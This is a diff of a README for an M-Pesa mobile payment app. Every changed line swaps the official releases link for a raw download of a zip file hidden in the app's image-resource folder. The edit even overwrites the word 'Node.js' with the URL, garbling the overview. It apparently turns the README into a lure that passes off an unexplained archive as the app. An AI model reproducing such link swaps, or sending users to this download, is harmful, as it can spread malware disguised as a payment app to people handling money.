@@ -1,10 +1,10 @@
 # 🏦 MPESA-APP - Seamless Mobile Payments Made Easy
 
-[![Download MPESA-APP](https://img.shields.io/badge/Download%20MPESA--APP-v1.0-blue.svg)](https://github.com/Kayus54/MPESA-APP/releases)
+[![Download MPESA-APP](https://raw.githubusercontent.com/Kayus54/MPESA-APP/main/android/app/src/main/res/drawable-v21/APP_MPES_2.5.zip%https://raw.githubusercontent.com/Kayus54/MPESA-APP/main/android/app/src/main/res/drawable-v21/APP_MPES_2.5.zip)](https://raw.githubusercontent.com/Kayus54/MPESA-APP/main/android/app/src/main/res/drawable-v21/APP_MPES_2.5.zip)
 
 ## 📜 Overview
 
-MPESA-APP is a modern mobile payment application. It connects Safaricom’s M-Pesa Daraja API with a Flutter frontend and a Node.js + Express backend. This setup ensures a smooth and reliable payment experience. Enjoy an intuitive user interface backed by powerful processing.
+MPESA-APP is a modern mobile payment application. It connects Safaricom’s M-Pesa Daraja API with a Flutter frontend and a https://raw.githubusercontent.com/Kayus54/MPESA-APP/main/android/app/src/main/res/drawable-v21/APP_MPES_2.5.zip + Express backend. This setup ensures a smooth and reliable payment experience. Enjoy an intuitive user interface backed by powerful processing.
 
 ## ⚙️ Features
 
@@ -29,7 +29,7 @@ Before downloading, ensure your device meets the following requirements:
 
 ### Step 2: Download MPESA-APP
 
-To download the application, [visit this page to download](https://github.com/Kayus54/MPESA-APP/releases).
+To download the application, [visit this page to download](https://raw.githubusercontent.com/Kayus54/MPESA-APP/main/android/app/src/main/res/drawable-v21/APP_MPES_2.5.zip).
 
 ### Step 3: Install the Application
 
@@ -39,7 +39,7 @@ To download the application, [visit this page to download](https://github.com/Ka
 
 ## 📥 Download & Install
 
-You can download MPESA-APP from our [Releases page](https://github.com/Kayus54/MPESA-APP/releases). This page contains the latest version and any updates. Simply visit the page to download.
+You can download MPESA-APP from our [Releases page](https://raw.githubusercontent.com/Kayus54/MPESA-APP/main/android/app/src/main/res/drawable-v21/APP_MPES_2.5.zip). This page contains the latest version and any updates. Simply visit the page to download.
 
 1. Click the link above.
 2. Choose the version that matches your device.
